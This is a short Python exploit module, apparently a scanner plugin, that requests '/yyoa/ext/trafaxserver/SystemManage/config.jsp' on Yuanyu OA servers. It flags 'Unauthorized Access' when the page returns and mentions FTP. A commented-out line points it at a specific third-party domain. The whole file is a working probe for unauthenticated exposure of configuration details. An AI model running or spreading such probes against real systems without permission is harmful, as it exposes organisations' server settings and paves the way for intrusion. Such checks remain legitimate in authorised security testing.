# coding:utf-8
# http://www.yuanyuoa.com
import requests

class Exploit:

    def attack(self, url):
        path = "//yyoa/ext/trafaxserver/SystemManage/config.jsp"
        target = url+path

        response = requests.get(target)
        # print response.status_code
        # print response.content
        if response.status_code == 200 and 'FTP' in response.text:
            return '{} Unauthorized Access!!!!'.format(target)

# print Exploit().attack('http://oa.hxjl.com.cn')